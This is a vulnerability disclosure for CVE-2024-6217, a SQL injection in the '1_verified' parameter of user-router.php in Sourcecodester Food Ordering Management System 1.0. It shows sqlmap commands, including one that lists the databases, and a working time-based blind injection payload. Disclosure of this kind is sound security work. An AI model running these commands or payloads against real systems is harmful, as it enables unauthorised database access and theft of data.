
# SQL Injection vulnerability was discovered from Sourcecodester Food Ordering Management System 1.0 (user-router.php)
## CVE-2024-6217
Affected Project: Sourcecodester Food Ordering Management System 1.0
Official Website: https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html
Version: 1.0

Related Code file: user-router.php

Injection parameter: 1_verified


## Vulnerability Analysis

1. Lack of Input Validation and Sanitization:
The '1_verified' parameter fields are directly used in the SQL query without any sanitization or validation. This allows an attacker to manipulate the SQL query by injecting malicious SQL code.

2. Use of Plain SQL Queries:
The script likely uses plain SQL queries to interact with the database. Without prepared statements, this approach is highly vulnerable to SQL injection.

## Demonstraation

Below is the users.php. By clicking on "Modify", we can access user-router.php:

`http://172.16.76.1/foms/users.php`

![image](https://github.com/jadu101/CVE/assets/76433661/a007fd00-1573-4c4f-92f0-01cc212c2253)

We will first intercept the traffic using Burp Suite:

![image](https://github.com/jadu101/CVE/assets/76433661/e3a06a90-6829-4821-be84-376f1e8853a6)

Save the intercepted request to a .txt file and execute sqlmap towards it. 

parameter 1_verified is vulnerable to time-based blind sql injection

Below commands verifies the vulnerability:

`sqlmap -r foms_user_router.txt --batch`

![image](https://github.com/jadu101/CVE/assets/76433661/c819e930-cc89-443a-a411-1564c81a6c98)

```
---
Parameter: 1_verified (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: 1_role=Administrator&1_verified=1' AND (SELECT 7078 FROM (SELECT(SLEEP(5)))GiGD) AND 'QLkI'='QLkI&1_deleted=0&1_balance=2000&4_role=Customer&4_verified=1&4_deleted=0&4_balance=1224&5_role=Customer&5_verified=0&5_deleted=0&5_balance=2000&6_role=Customer&6_verified=0&6_deleted=0&6_balance=2000&75_role=Customer&75_verified=0&75_deleted=0&75_balance=2001&action=
---
```

Below commnd will list databases:

`sqlmap -r foms_user_router.txt --batch --dbs`

![image](https://github.com/jadu101/CVE/assets/76433661/41fda954-8efa-4597-a3ff-399f75db7585)
